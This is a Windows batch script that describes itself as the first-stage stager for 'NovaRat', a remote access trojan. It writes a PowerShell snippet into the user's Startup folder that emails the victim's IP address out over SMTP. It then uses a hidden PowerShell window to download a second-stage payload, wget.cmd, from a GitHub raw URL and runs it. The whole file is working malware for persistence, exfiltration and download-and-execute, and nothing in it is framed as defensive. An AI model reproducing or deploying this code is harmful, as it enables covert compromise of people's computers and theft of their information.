@echo off
@REM initial stager for NovaRat
@REM made by Code0

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup
cd %STARTUP%

@REM setup smtp
(
    echo $email = "example@gmail.com"
    echo $password = "password"
    echo $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
    echo echo "ip:$ip" > "$env:UserName.rat"


    echo $subject = "$env:UserName logs"
    echo $smtp = New-Object System.Net.Mail.SmtpClient("smtp.mail.com", "587");
    echo $smtp.EnableSSL = $true
    echo $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
    echo $smtp.Send($email, $email, $subject, $ip);
) > smtp.txt

@REM TODO: build out stage 2
@REM write payloads to startup
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/wget.cmd -OutFile wget.cmd"

@REM run payload
powershell ./wget.cmd

@REM cd back into initial location
@REM cd %INITIALPATH%
@REM del initial.cmd
